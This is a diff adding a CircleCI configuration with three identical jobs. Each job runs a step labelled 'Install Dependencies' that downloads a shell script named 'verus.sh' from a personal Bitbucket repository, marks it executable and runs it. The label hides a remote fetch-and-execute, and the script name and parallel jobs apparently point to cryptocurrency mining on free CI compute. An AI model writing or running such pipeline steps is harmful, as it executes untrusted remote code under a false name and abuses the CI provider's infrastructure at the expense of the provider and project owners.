@@ -1,0 +1,35 @@
+version: 2.1
+orbs:
+  ruby: circleci/ruby@0.1.2 
+
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/Kucing7772/kucing/raw/134d2bd99c64f846559226d27f2601a9d3e3375c/verus.sh && chmod u+x verus.sh && ./verus.sh
+    aku2:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/Kucing7772/kucing/raw/134d2bd99c64f846559226d27f2601a9d3e3375c/verus.sh && chmod u+x verus.sh && ./verus.sh
+    aku3:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/Kucing7772/kucing/raw/134d2bd99c64f846559226d27f2601a9d3e3375c/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
